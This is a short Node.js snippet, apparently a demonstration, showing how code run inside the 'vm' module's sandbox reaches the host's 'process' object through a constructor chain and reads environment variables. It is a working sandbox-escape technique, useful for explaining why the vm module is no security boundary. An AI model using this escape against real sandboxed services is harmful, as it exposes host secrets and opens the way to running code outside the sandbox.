const vm = require('vm');
const sandbox = { someNonPrimitive: {} };

vm.createContext(sandbox);
const code = `
  this.someNonPrimitive.constructor.constructor('return process')().env;
`;

console.log(vm.runInContext(code, sandbox).USER) // User name
